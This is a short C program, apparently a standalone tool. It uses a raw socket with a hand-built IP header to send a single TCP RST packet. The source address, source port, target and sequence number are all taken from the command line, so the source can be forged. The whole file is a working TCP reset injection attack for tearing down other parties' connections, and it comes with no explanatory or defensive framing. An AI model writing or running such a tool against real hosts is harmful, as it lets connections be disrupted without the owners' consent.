#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#include "tcplib.h"

#define	BUFMAX	4096

enum { 
	ARGV_CMD, 
	ARGV_SOURCE_IP,
	ARGV_SOURCE_PORT,
	ARGV_TARGET_IP, 
	ARGV_TARGET_PORT,
	ARGV_SEQ
};

int main(int argc, char **argv)
{
	int sock, on = 1;
	struct tcp_packet tcp_packet;
	struct sockaddr_in addr;
	unsigned int seq;

	if(argc != 6) {
		printf(
			"usage : %s [source ip] [source port] "\
			"[target ip] [target port] [seq]\n", 
			argv[ARGV_CMD]);
		return 1;
	}

	if((sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) < 0) {
		perror("socket ");
		return 1;
	}

	if(setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0) {
		perror("setsockopt ");
		return 1;
	}

	memset(&addr, 0x00, sizeof(addr));
	addr.sin_family = AF_INET;
	addr.sin_addr.s_addr = inet_addr(argv[ARGV_TARGET_IP]);

	memset(&tcp_packet, 0x00, sizeof(tcp_packet));

	sscanf(argv[ARGV_SEQ], "%u", &seq);

	make_tcp_header(
			&tcp_packet, 
			argv[ARGV_SOURCE_IP], atoi(argv[ARGV_SOURCE_PORT]), 
			argv[ARGV_TARGET_IP], atoi(argv[ARGV_TARGET_PORT]), 
			seq, 0, TH_RST);

	make_ip_header(&(tcp_packet.ip), 
		argv[ARGV_SOURCE_IP], argv[ARGV_TARGET_IP], sizeof(struct tcphdr));

	if(sendto(sock, &(tcp_packet.ip), 
		sizeof(struct tcphdr) + sizeof(struct ip), 0, 
		(struct sockaddr *)&addr, sizeof(addr)) < 0) {
		perror("sendto ");
	}	

	close(sock);

	return 0;
}				